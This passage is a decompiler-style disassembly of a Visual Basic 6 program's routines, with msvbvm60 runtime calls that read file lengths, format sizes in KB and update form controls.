00851D0D: movsd 
00851D0E: movsd 
00851D0F: push 00000001h
00851D11: lea eax, var_40
00851D14: push eax
00851D15: lea eax, var_00000084
00851D1B: push eax
00851D1C: call 00410952h ; msvbvm60.dll.__vbaVarIndexLoad
00851D21: add esp, 0000001Ch
00851D24: push eax
00851D25: lea eax, var_44
00851D28: push eax
00851D29: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
00851D2E: push eax
00851D2F: call 004108A4h ; FileLen(arg_1)
00851D34: mov var_00000128, eax
00851D3A: fild dword ptr var_00000128
00851D40: fstp real8 ptr var_000001A0
00851D46: fld real8 ptr var_000001A0
00851D4C: cmp [008F2000h], 00000000h
00851D53: jnz 851D5Dh
00851D55: fdiv real8 ptr [00404D48h]
00851D5B: jmp 851D6Eh
00851D5D: push [00404D4Ch]
00851D63: push [00404D48h]
00851D69: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
00851D6E: fstp real8 ptr var_0000008C
00851D74: fstsw ax
00851D76: test al, 0Dh
00851D78: jnz 00852353h
00851D7E: mov var_00000094, 00000005h
00851D88: push 00000002h
00851D8A: lea eax, var_00000094
00851D90: push eax
00851D91: lea eax, var_000000A4
00851D97: push eax
00851D98: call 0041074Eh ; Round(arg_1)
00851D9D: mov eax, [ebp+08h]
00851DA0: mov eax, [eax]
00851DA2: push [ebp+08h]
00851DA5: call [eax+00000300h]
00851DAB: push eax
00851DAC: lea eax, var_4C
00851DAF: push eax
00851DB0: call 00410A84h ; Set (object)
00851DB5: mov var_00000130, eax
00851DBB: mov var_0000011C, 80020004h
00851DC5: mov var_00000124, 0000000Ah
00851DCF: mov var_000000DC, 00445568h
00851DD9: mov var_000000E4, 00000008h
00851DE3: mov var_0000010C, 004552FCh ; KB
00851DED: mov var_00000114, 00000008h
00851DF7: push 00000010h
00851DF9: pop eax
00851DFA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00851DFF: lea esi, var_00000124
00851E05: mov edi, esp
00851E07: movsd 
00851E08: movsd 
00851E09: movsd 
00851E0A: movsd 
00851E0B: lea eax, var_64
00851E0E: push eax
00851E0F: lea eax, var_000000E4
00851E15: push eax
00851E16: lea eax, var_74
00851E19: push eax
00851E1A: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00851E1F: push eax
00851E20: lea eax, var_000000A4
00851E26: push eax
00851E27: lea eax, var_000000B4
00851E2D: push eax
00851E2E: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00851E33: push eax
00851E34: lea eax, var_00000114
00851E3A: push eax
00851E3B: lea eax, var_000000C4
00851E41: push eax
00851E42: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00851E47: push eax
00851E48: lea eax, var_48
00851E4B: push eax
00851E4C: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
00851E51: push eax
00851E52: mov eax, var_00000130
00851E58: mov eax, [eax]
00851E5A: push var_00000130
00851E60: call [eax+000001ECh]
00851E66: fclex 
00851E68: mov var_00000134, eax
00851E6E: cmp var_00000134, 00000000h
00851E75: jnl 851E9Ah
00851E77: push 000001ECh
00851E7C: push 004425F4h
00851E81: push var_00000130
00851E87: push var_00000134
00851E8D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00851E92: mov var_000001A4, eax
00851E98: jmp 851EA1h
00851E9A: and var_000001A4, 00000000h
00851EA1: lea eax, var_48
00851EA4: push eax
00851EA5: lea eax, var_44
00851EA8: push eax
00851EA9: push 00000002h
00851EAB: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00851EB0: add esp, 0000000Ch
00851EB3: lea ecx, var_4C
00851EB6: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00851EBB: lea eax, var_000000C4
00851EC1: push eax
00851EC2: lea eax, var_000000B4
00851EC8: push eax
00851EC9: lea eax, var_000000A4
00851ECF: push eax
00851ED0: lea eax, var_74
00851ED3: push eax
00851ED4: lea eax, var_00000094
00851EDA: push eax
00851EDB: lea eax, var_00000084
00851EE1: push eax
00851EE2: lea eax, var_64
00851EE5: push eax
00851EE6: push 00000007h
00851EE8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00851EED: add esp, 00000020h
00851EF0: mov var_04, 00000008h
00851EF7: call 0041096Ah ; DoEvents
00851EFC: mov var_04, 00000009h
00851F03: lea eax, var_00000174
00851F09: push eax
00851F0A: lea eax, var_00000164
00851F10: push eax
00851F11: lea eax, var_30
00851F14: push eax
00851F15: call 00410A36h ; Next
00851F1A: mov var_0000018C, eax
00851F20: cmp var_0000018C, 00000000h
00851F27: jnz 00851CA8h
00851F2D: mov var_04, 0000000Ah
00851F34: cmp [008F529Ch], 00000000h
00851F3B: jnz 851F58h
00851F3D: push 008F529Ch
00851F42: push 00440F2Ch
00851F47: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00851F4C: mov var_000001A8, 008F529Ch
00851F56: jmp 851F62h
00851F58: mov var_000001A8, 008F529Ch
00851F62: mov eax, var_000001A8
00851F68: mov eax, [eax]
00851F6A: mov var_00000130, eax
00851F70: lea eax, var_4C
00851F73: push eax
00851F74: mov eax, var_00000130
00851F7A: mov eax, [eax]
00851F7C: push var_00000130
00851F82: call [eax+18h]
00851F85: fclex 
00851F87: mov var_00000134, eax
00851F8D: cmp var_00000134, 00000000h
00851F94: jnl 851FB6h
00851F96: push 00000018h
00851F98: push 00440F1Ch
00851F9D: push var_00000130
00851FA3: push var_00000134
00851FA9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00851FAE: mov var_000001AC, eax
00851FB4: jmp 851FBDh
00851FB6: and var_000001AC, 00000000h
00851FBD: mov eax, var_4C
00851FC0: mov var_00000138, eax
00851FC6: lea eax, var_00000128
00851FCC: push eax
00851FCD: mov eax, var_00000138
00851FD3: mov eax, [eax]
00851FD5: push var_00000138
00851FDB: call [eax+00000098h]
00851FE1: fclex 
00851FE3: mov var_0000013C, eax
00851FE9: cmp var_0000013C, 00000000h
00851FF0: jnl 852015h
00851FF2: push 00000098h
00851FF7: push 0044C888h
00851FFC: push var_00000138
00852002: push var_0000013C
00852008: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085200D: mov var_000001B0, eax
00852013: jmp 85201Ch
00852015: and var_000001B0, 00000000h
0085201C: mov eax, [ebp+08h]
0085201F: mov eax, [eax]
00852021: push [ebp+08h]
00852024: call [eax+00000300h]
0085202A: push eax
0085202B: lea eax, var_54
0085202E: push eax
0085202F: call 00410A84h ; Set (object)
00852034: mov var_00000150, eax
0085203A: cmp [008F529Ch], 00000000h
00852041: jnz 85205Eh
00852043: push 008F529Ch
00852048: push 00440F2Ch
0085204D: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00852052: mov var_000001B4, 008F529Ch
0085205C: jmp 852068h
0085205E: mov var_000001B4, 008F529Ch
00852068: mov eax, var_000001B4
0085206E: mov eax, [eax]
00852070: mov var_00000140, eax
00852076: lea eax, var_50
00852079: push eax
0085207A: mov eax, var_00000140
00852080: mov eax, [eax]
00852082: push var_00000140
00852088: call [eax+18h]
0085208B: fclex 
0085208D: mov var_00000144, eax
00852093: cmp var_00000144, 00000000h
0085209A: jnl 8520BCh
0085209C: push 00000018h
0085209E: push 00440F1Ch
008520A3: push var_00000140
008520A9: push var_00000144
008520AF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008520B4: mov var_000001B8, eax
008520BA: jmp 8520C3h
008520BC: and var_000001B8, 00000000h
008520C3: mov eax, var_50
008520C6: mov var_00000148, eax
008520CC: lea eax, var_0000012C
008520D2: push eax
008520D3: mov eax, var_00000148
008520D9: mov eax, [eax]
008520DB: push var_00000148
008520E1: call [eax+50h]
008520E4: fclex 
008520E6: mov var_0000014C, eax
008520EC: cmp var_0000014C, 00000000h
008520F3: jnl 852115h
008520F5: push 00000050h
008520F7: push 0044C888h
008520FC: push var_00000148
00852102: push var_0000014C
00852108: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085210D: mov var_000001BC, eax
00852113: jmp 85211Ch
00852115: and var_000001BC, 00000000h
0085211C: fld real4 ptr var_0000012C
00852122: fadd real4 ptr [0040C7BCh]
00852128: fstp real4 ptr var_000000EC
0085212E: fstsw ax
00852130: test al, 0Dh
00852132: jnz 00852353h
00852138: mov var_000000F4, 00000004h
00852142: fld real4 ptr var_00000128
00852148: fadd real4 ptr [0040C7B8h]
0085214E: fstp real4 ptr var_000000DC
00852154: fstsw ax
00852156: test al, 0Dh
00852158: jnz 00852353h
0085215E: mov var_000000E4, 00000004h
00852168: and var_000000CC, 00000000h
0085216F: mov var_000000D4, 00000002h
00852179: push 00000010h
0085217B: pop eax
0085217C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852181: lea esi, var_000000F4
00852187: mov edi, esp
00852189: movsd 
0085218A: movsd 
0085218B: movsd 
0085218C: movsd 
0085218D: push 00000010h
0085218F: pop eax
00852190: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00852195: lea esi, var_000000E4
0085219B: mov edi, esp
0085219D: movsd 
0085219E: movsd 
0085219F: movsd 
008521A0: movsd 
008521A1: push 00000010h
008521A3: pop eax
008521A4: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008521A9: lea esi, var_000000D4
008521AF: mov edi, esp
008521B1: movsd 
008521B2: movsd 
008521B3: movsd 
008521B4: movsd 
008521B5: fldz 
008521B7: push ecx
008521B8: fstp real4 ptr [esp]
008521BB: mov eax, var_00000150
008521C1: mov eax, [eax]
008521C3: push var_00000150
008521C9: call [eax+00000204h]
008521CF: fclex 
008521D1: mov var_00000154, eax
008521D7: cmp var_00000154, 00000000h
008521DE: jnl 852203h
008521E0: push 00000204h
008521E5: push 004425F4h
008521EA: push var_00000150
008521F0: push var_00000154
008521F6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008521FB: mov var_000001C0, eax
00852201: jmp 85220Ah
00852203: and var_000001C0, 00000000h
0085220A: lea eax, var_54
0085220D: push eax
0085220E: lea eax, var_50
00852211: push eax
00852212: lea eax, var_4C
00852215: push eax
00852216: push 00000003h
00852218: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085221D: add esp, 00000010h
00852220: mov var_04, 0000000Bh
00852227: mov eax, [ebp+08h]
0085222A: mov eax, [eax]
0085222C: push [ebp+08h]
0085222F: call [eax+00000300h]
00852235: push eax
00852236: lea eax, var_4C
00852239: push eax
0085223A: call 00410A84h ; Set (object)
0085223F: mov var_00000130, eax
00852245: push FFFFFFFFh
00852247: mov eax, var_00000130
0085224D: mov eax, [eax]
0085224F: push var_00000130
00852255: call [eax+00000094h]
0085225B: fclex 
0085225D: mov var_00000134, eax
00852263: cmp var_00000134, 00000000h
0085226A: jnl 85228Fh
0085226C: push 00000094h
00852271: push 004425F4h
00852276: push var_00000130
0085227C: push var_00000134
00852282: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00852287: mov var_000001C4, eax
0085228D: jmp 852296h
0085228F: and var_000001C4, 00000000h
00852296: lea ecx, var_4C
00852299: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085229E: mov var_10, 00000000h
008522A5: wait 
008522A6: push 00852334h
008522AB: jmp 85230Bh
008522AD: lea eax, var_48
008522B0: push eax
008522B1: lea eax, var_44
008522B4: push eax
008522B5: push 00000002h
008522B7: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008522BC: add esp, 0000000Ch
008522BF: lea eax, var_54
008522C2: push eax
008522C3: lea eax, var_50
008522C6: push eax
008522C7: lea eax, var_4C
008522CA: push eax
008522CB: push 00000003h
008522CD: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008522D2: add esp, 00000010h
008522D5: lea eax, var_000000C4
008522DB: push eax
008522DC: lea eax, var_000000B4
008522E2: push eax
008522E3: lea eax, var_000000A4
008522E9: push eax
008522EA: lea eax, var_00000094
008522F0: push eax
008522F1: lea eax, var_00000084
008522F7: push eax
008522F8: lea eax, var_74
008522FB: push eax
008522FC: lea eax, var_64
008522FF: push eax
00852300: push 00000007h
00852302: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00852307: add esp, 00000020h
0085230A: ret 
End Sub

Private sub unknown_853AD3
00853AD3: push ebp
00853AD4: mov ebp, esp
00853AD6: sub esp, 0000000Ch
00853AD9: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00853ADE: mov eax, fs:[00h]
00853AE4: push eax
00853AE5: mov fs:[00000000h], esp
00853AEC: mov eax, 000000C4h
00853AF1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853AF6: push ebx
00853AF7: push esi
00853AF8: push edi
00853AF9: mov var_0C, esp
00853AFC: mov var_08, 0040C890h
00853B03: mov var_04, 00000000h
00853B0A: mov eax, [ebp+08h]
00853B0D: mov eax, [eax]
00853B0F: push [ebp+08h]
00853B12: call [eax+04h]
00853B15: mov edx, [ebp+0Ch]
00853B18: lea ecx, var_18
00853B1B: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00853B20: mov edx, [ebp+10h]
00853B23: lea ecx, var_1C
00853B26: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00853B2B: mov edx, [ebp+14h]
00853B2E: lea ecx, var_20
00853B31: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00853B36: cmp [008F529Ch], 00000000h
00853B3D: jnz 853B5Ah
00853B3F: push 008F529Ch
00853B44: push 00440F2Ch
00853B49: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00853B4E: mov var_00000090, 008F529Ch
00853B58: jmp 853B64h
00853B5A: mov var_00000090, 008F529Ch
00853B64: mov eax, var_00000090
00853B6A: mov eax, [eax]
00853B6C: mov var_64, eax
00853B6F: lea eax, var_24
00853B72: push eax
00853B73: mov eax, var_64
00853B76: mov eax, [eax]
00853B78: push var_64
00853B7B: call [eax+18h]
00853B7E: fclex 
00853B80: mov var_68, eax
00853B83: cmp var_68, 00000000h
00853B87: jnl 853BA3h
00853B89: push 00000018h
00853B8B: push 00440F1Ch
00853B90: push var_64
00853B93: push var_68
00853B96: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853B9B: mov var_00000094, eax
00853BA1: jmp 853BAAh
00853BA3: and var_00000094, 00000000h
00853BAA: mov eax, var_24
00853BAD: mov var_6C, eax
00853BB0: lea eax, var_5C
00853BB3: push eax
00853BB4: mov eax, var_6C
00853BB7: mov eax, [eax]
00853BB9: push var_6C
00853BBC: call [eax+00000098h]
00853BC2: fclex 
00853BC4: mov var_70, eax
00853BC7: cmp var_70, 00000000h
00853BCB: jnl 853BEAh
00853BCD: push 00000098h
00853BD2: push 0044C888h
00853BD7: push var_6C
00853BDA: push var_70
00853BDD: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853BE2: mov var_00000098, eax
00853BE8: jmp 853BF1h
00853BEA: and var_00000098, 00000000h
00853BF1: cmp [008F529Ch], 00000000h
00853BF8: jnz 853C15h
00853BFA: push 008F529Ch
00853BFF: push 00440F2Ch
00853C04: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00853C09: mov var_0000009C, 008F529Ch
00853C13: jmp 853C1Fh
00853C15: mov var_0000009C, 008F529Ch
00853C1F: mov eax, var_0000009C
00853C25: mov eax, [eax]
00853C27: mov var_74, eax
00853C2A: lea eax, var_28
00853C2D: push eax
00853C2E: mov eax, var_74
00853C31: mov eax, [eax]
00853C33: push var_74
00853C36: call [eax+18h]
00853C39: fclex 
00853C3B: mov var_78, eax
00853C3E: cmp var_78, 00000000h
00853C42: jnl 853C5Eh
00853C44: push 00000018h
00853C46: push 00440F1Ch
00853C4B: push var_74
00853C4E: push var_78
00853C51: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853C56: mov var_000000A0, eax
00853C5C: jmp 853C65h
00853C5E: and var_000000A0, 00000000h
00853C65: mov eax, var_28
00853C68: mov var_7C, eax
00853C6B: lea eax, var_60
00853C6E: push eax
00853C6F: mov eax, var_7C
00853C72: mov eax, [eax]
00853C74: push var_7C
00853C77: call [eax+50h]
00853C7A: fclex 
00853C7C: mov var_80, eax
00853C7F: cmp var_80, 00000000h
00853C83: jnl 853C9Fh
00853C85: push 00000050h
00853C87: push 0044C888h
00853C8C: push var_7C
00853C8F: push var_80
00853C92: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853C97: mov var_000000A4, eax
00853C9D: jmp 853CA6h
00853C9F: and var_000000A4, 00000000h
00853CA6: fld real4 ptr var_60
00853CA9: fstp real4 ptr var_50
00853CAC: mov var_58, 00000004h
00853CB3: fld real4 ptr var_5C
00853CB6: fstp real4 ptr var_40
00853CB9: mov var_48, 00000004h
00853CC0: and var_30, 00000000h
00853CC4: mov var_38, 00000002h
00853CCB: push 00000010h
00853CCD: pop eax
00853CCE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853CD3: lea esi, var_58
00853CD6: mov edi, esp
00853CD8: movsd 
00853CD9: movsd 
00853CDA: movsd 
00853CDB: movsd 
00853CDC: push 00000010h
00853CDE: pop eax
00853CDF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853CE4: lea esi, var_48
00853CE7: mov edi, esp
00853CE9: movsd 
00853CEA: movsd 
00853CEB: movsd 
00853CEC: movsd 
00853CED: push 00000010h
00853CEF: pop eax
00853CF0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00853CF5: lea esi, var_38
00853CF8: mov edi, esp
00853CFA: movsd 
00853CFB: movsd 
00853CFC: movsd 
00853CFD: movsd 
00853CFE: fldz 
00853D00: push ecx
00853D01: fstp real4 ptr [esp]
00853D04: mov eax, [ebp+08h]
00853D07: mov eax, [eax]
00853D09: push [ebp+08h]
00853D0C: call [eax+000002A4h]
00853D12: fclex 
00853D14: mov var_00000084, eax
00853D1A: cmp var_00000084, 00000000h
00853D21: jnl 853D43h
00853D23: push 000002A4h
00853D28: push 004448FCh
00853D2D: push [ebp+08h]
00853D30: push var_00000084
00853D36: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853D3B: mov var_000000A8, eax
00853D41: jmp 853D4Ah
00853D43: and var_000000A8, 00000000h
00853D4A: lea eax, var_28
00853D4D: push eax
00853D4E: lea eax, var_24
00853D51: push eax
00853D52: push 00000002h
00853D54: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00853D59: add esp, 0000000Ch
00853D5C: push [ebp+1Ch]
00853D5F: mov eax, [ebp+08h]
00853D62: mov eax, [eax]
00853D64: push [ebp+08h]
00853D67: call [eax+64h]
00853D6A: fclex 
00853D6C: mov var_64, eax
00853D6F: cmp var_64, 00000000h
00853D73: jnl 853D8Fh
00853D75: push 00000064h
00853D77: push 004448FCh
00853D7C: push [ebp+08h]
00853D7F: push var_64
00853D82: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853D87: mov var_000000AC, eax
00853D8D: jmp 853D96h
00853D8F: and var_000000AC, 00000000h
00853D96: mov eax, [ebp+08h]
00853D99: mov eax, [eax]
00853D9B: push [ebp+08h]
00853D9E: call [eax+00000320h]
00853DA4: push eax
00853DA5: lea eax, var_24
00853DA8: push eax
00853DA9: call 00410A84h ; Set (object)
00853DAE: mov var_64, eax
00853DB1: push [ebp+18h]
00853DB4: mov eax, var_64
00853DB7: mov eax, [eax]
00853DB9: push var_64
00853DBC: call [eax+6Ch]
00853DBF: fclex 
00853DC1: mov var_68, eax
00853DC4: cmp var_68, 00000000h
00853DC8: jnl 853DE4h
00853DCA: push 0000006Ch
00853DCC: push 004425E4h
00853DD1: push var_64
00853DD4: push var_68
00853DD7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853DDC: mov var_000000B0, eax
00853DE2: jmp 853DEBh
00853DE4: and var_000000B0, 00000000h
00853DEB: lea ecx, var_24
00853DEE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00853DF3: mov eax, [ebp+08h]
00853DF6: mov eax, [eax]
00853DF8: push [ebp+08h]
00853DFB: call [eax+0000031Ch]
00853E01: push eax
00853E02: lea eax, var_24
00853E05: push eax
00853E06: call 00410A84h ; Set (object)
00853E0B: mov var_64, eax
00853E0E: push [ebp+20h]
00853E11: mov eax, var_64
00853E14: mov eax, [eax]
00853E16: push var_64
00853E19: call [eax+6Ch]
00853E1C: fclex 
00853E1E: mov var_68, eax
00853E21: cmp var_68, 00000000h
00853E25: jnl 853E41h
00853E27: push 0000006Ch
00853E29: push 004425E4h
00853E2E: push var_64
00853E31: push var_68
00853E34: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853E39: mov var_000000B4, eax
00853E3F: jmp 853E48h
00853E41: and var_000000B4, 00000000h
00853E48: lea ecx, var_24
00853E4B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00853E50: mov eax, [ebp+08h]
00853E53: mov eax, [eax]
00853E55: push [ebp+08h]
00853E58: call [eax+00000314h]
00853E5E: push eax
00853E5F: lea eax, var_24
00853E62: push eax
00853E63: call 00410A84h ; Set (object)
00853E68: mov var_64, eax
00853E6B: push [ebp+24h]
00853E6E: mov eax, var_64
00853E71: mov eax, [eax]
00853E73: push var_64
00853E76: call [eax+6Ch]
00853E79: fclex 
00853E7B: mov var_68, eax
00853E7E: cmp var_68, 00000000h
00853E82: jnl 853E9Eh
00853E84: push 0000006Ch
00853E86: push 004425E4h
00853E8B: push var_64
00853E8E: push var_68
00853E91: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853E96: mov var_000000B8, eax
00853E9C: jmp 853EA5h
00853E9E: and var_000000B8, 00000000h
00853EA5: lea ecx, var_24
00853EA8: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00853EAD: mov eax, [ebp+28h]
00853EB0: cmp [eax], 00000000h
00853EB3: jnz 00853F79h
00853EB9: mov eax, [ebp+08h]
00853EBC: mov eax, [eax]
00853EBE: push [ebp+08h]
00853EC1: call [eax+00000308h]
00853EC7: push eax
00853EC8: lea eax, var_24
00853ECB: push eax
00853ECC: call 00410A84h ; Set (object)
00853ED1: mov var_64, eax
00853ED4: push 00000000h
00853ED6: mov eax, var_64
00853ED9: mov eax, [eax]
00853EDB: push var_64
00853EDE: call [eax+5Ch]
00853EE1: fclex 
00853EE3: mov var_68, eax
00853EE6: cmp var_68, 00000000h
00853EEA: jnl 853F06h
00853EEC: push 0000005Ch
00853EEE: push 00447A20h
00853EF3: push var_64
00853EF6: push var_68
00853EF9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853EFE: mov var_000000BC, eax
00853F04: jmp 853F0Dh
00853F06: and var_000000BC, 00000000h
00853F0D: lea ecx, var_24
00853F10: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00853F15: mov eax, [ebp+08h]
00853F18: mov eax, [eax]
00853F1A: push [ebp+08h]
00853F1D: call [eax+00000318h]
00853F23: push eax
00853F24: lea eax, var_24
00853F27: push eax
00853F28: call 00410A84h ; Set (object)
00853F2D: mov var_64, eax
00853F30: push 00000000h
00853F32: mov eax, var_64
00853F35: mov eax, [eax]
00853F37: push var_64
00853F3A: call [eax+0000009Ch]
00853F40: fclex 
00853F42: mov var_68, eax
00853F45: cmp var_68, 00000000h
00853F49: jnl 853F68h
00853F4B: push 0000009Ch
00853F50: push 004425E4h
00853F55: push var_64
00853F58: push var_68
00853F5B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853F60: mov var_000000C0, eax
00853F66: jmp 853F6Fh
00853F68: and var_000000C0, 00000000h
00853F6F: lea ecx, var_24
00853F72: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00853F77: jmp 853FE6h
00853F79: mov eax, [ebp+08h]
00853F7C: mov ecx, [ebp+28h]
00853F7F: mov ecx, [ecx]
00853F81: mov [eax+34h], ecx
00853F84: mov eax, [ebp+08h]
00853F87: mov eax, [eax]
00853F89: push [ebp+08h]
00853F8C: call [eax+00000318h]
00853F92: push eax
00853F93: lea eax, var_24
00853F96: push eax
00853F97: call 00410A84h ; Set (object)
00853F9C: mov var_64, eax
00853F9F: push FFFFFFFFh
00853FA1: mov eax, var_64
00853FA4: mov eax, [eax]
00853FA6: push var_64
00853FA9: call [eax+0000009Ch]
00853FAF: fclex 
00853FB1: mov var_68, eax
00853FB4: cmp var_68, 00000000h
00853FB8: jnl 853FD7h
00853FBA: push 0000009Ch
00853FBF: push 004425E4h
00853FC4: push var_64
00853FC7: push var_68
00853FCA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00853FCF: mov var_000000C4, eax
00853FD5: jmp 853FDEh
00853FD7: and var_000000C4, 00000000h
00853FDE: lea ecx, var_24
00853FE1: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00853FE6: mov eax, [ebp+08h]
00853FE9: mov eax, [eax]
00853FEB: push [ebp+08h]
00853FEE: call [eax+00000320h]
00853FF4: push eax
00853FF5: lea eax, var_24
00853FF8: push eax
00853FF9: call 00410A84h ; Set (object)
00853FFE: mov var_64, eax
00854001: push var_18
00854004: mov eax, var_64
00854007: mov eax, [eax]
00854009: push var_64
0085400C: call [eax+54h]
0085400F: fclex 
00854011: mov var_68, eax
00854014: cmp var_68, 00000000h
00854018: jnl 854034h
0085401A: push 00000054h
0085401C: push 004425E4h
00854021: push var_64
00854024: push var_68
00854027: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085402C: mov var_000000C8, eax
00854032: jmp 85403Bh
00854034: and var_000000C8, 00000000h
0085403B: lea ecx, var_24
0085403E: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854043: mov eax, [ebp+08h]
00854046: mov eax, [eax]
00854048: push [ebp+08h]
0085404B: call [eax+00000320h]
00854051: push eax
00854052: lea eax, var_24
00854055: push eax
00854056: call 00410A84h ; Set (object)
0085405B: mov var_64, eax
0085405E: push var_18
00854061: mov eax, var_64
00854064: mov eax, [eax]
00854066: push var_64
00854069: call [eax+00000134h]
0085406F: fclex 
00854071: mov var_68, eax
00854074: cmp var_68, 00000000h
00854078: jnl 854097h
0085407A: push 00000134h
0085407F: push 004425E4h
00854084: push var_64
00854087: push var_68
0085408A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085408F: mov var_000000CC, eax
00854095: jmp 85409Eh
00854097: and var_000000CC, 00000000h
0085409E: lea ecx, var_24
008540A1: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008540A6: mov eax, [ebp+08h]
008540A9: mov eax, [eax]
008540AB: push [ebp+08h]
008540AE: call [eax+0000031Ch]
008540B4: push eax
008540B5: lea eax, var_24
008540B8: push eax
008540B9: call 00410A84h ; Set (object)
008540BE: mov var_64, eax
008540C1: push var_1C
008540C4: mov eax, var_64
008540C7: mov eax, [eax]
008540C9: push var_64
008540CC: call [eax+54h]
008540CF: fclex 
008540D1: mov var_68, eax
008540D4: cmp var_68, 00000000h
008540D8: jnl 8540F4h
008540DA: push 00000054h
008540DC: push 004425E4h
008540E1: push var_64
008540E4: push var_68
008540E7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008540EC: mov var_000000D0, eax
008540F2: jmp 8540FBh
008540F4: and var_000000D0, 00000000h
008540FB: lea ecx, var_24
008540FE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854103: mov eax, [ebp+08h]
00854106: mov eax, [eax]
00854108: push [ebp+08h]
0085410B: call [eax+00000314h]
00854111: push eax
00854112: lea eax, var_24
00854115: push eax
00854116: call 00410A84h ; Set (object)
0085411B: mov var_64, eax
0085411E: push var_20
00854121: mov eax, var_64
00854124: mov eax, [eax]
00854126: push var_64
00854129: call [eax+54h]
0085412C: fclex 
0085412E: mov var_68, eax
00854131: cmp var_68, 00000000h
00854135: jnl 854151h
00854137: push 00000054h
00854139: push 004425E4h
0085413E: push var_64
00854141: push var_68
00854144: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854149: mov var_000000D4, eax
0085414F: jmp 854158h
00854151: and var_000000D4, 00000000h
00854158: lea ecx, var_24
0085415B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854160: mov eax, [ebp+08h]
00854163: mov eax, [eax]
00854165: push [ebp+08h]
00854168: call [eax+000002FCh]
0085416E: push eax
0085416F: lea eax, var_24
00854172: push eax
00854173: call 00410A84h ; Set (object)
00854178: mov var_64, eax
0085417B: mov eax, [ebp+2Ch]
0085417E: mov ax, [eax]
00854181: push eax
00854182: mov eax, var_64
00854185: mov eax, [eax]
00854187: push var_64
0085418A: call [eax+5Ch]
0085418D: fclex 
0085418F: mov var_68, eax
00854192: cmp var_68, 00000000h
00854196: jnl 8541B2h
00854198: push 0000005Ch
0085419A: push 00447A20h
0085419F: push var_64
008541A2: push var_68
008541A5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008541AA: mov var_000000D8, eax
008541B0: jmp 8541B9h
008541B2: and var_000000D8, 00000000h
008541B9: lea ecx, var_24
008541BC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008541C1: wait 
008541C2: push 008541F5h
008541C7: jmp 8541DCh
008541C9: lea eax, var_28
008541CC: push eax
008541CD: lea eax, var_24
008541D0: push eax
008541D1: push 00000002h
008541D3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008541D8: add esp, 0000000Ch
008541DB: ret 
End Sub

Private sub unknown_8538E5
008538E5: push ebp
008538E6: mov ebp, esp
008538E8: sub esp, 0000000Ch
008538EB: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008538F0: mov eax, fs:[00h]
008538F6: push eax
008538F7: mov fs:[00000000h], esp
008538FE: mov eax, 000000D0h
00853903: call 004106A0h ; msvbvm60.dll.__vbaChkstk
